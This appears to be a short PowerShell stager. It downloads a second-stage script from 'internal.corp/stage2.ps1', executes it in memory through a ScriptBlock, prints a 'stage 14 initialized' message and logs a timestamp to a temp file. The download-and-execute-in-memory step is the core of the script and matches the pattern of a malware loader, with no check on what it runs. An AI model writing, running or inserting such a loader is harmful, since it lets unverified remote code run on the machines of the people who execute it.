
$DownloadUrl = "http://internal.corp/stage2.ps1"
$RemoteScript = (iwr $DownloadUrl -UseBasicParsing).Content
[ScriptBlock]::Create($RemoteScript).Invoke()
Write-Output "stage 14 initialized"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
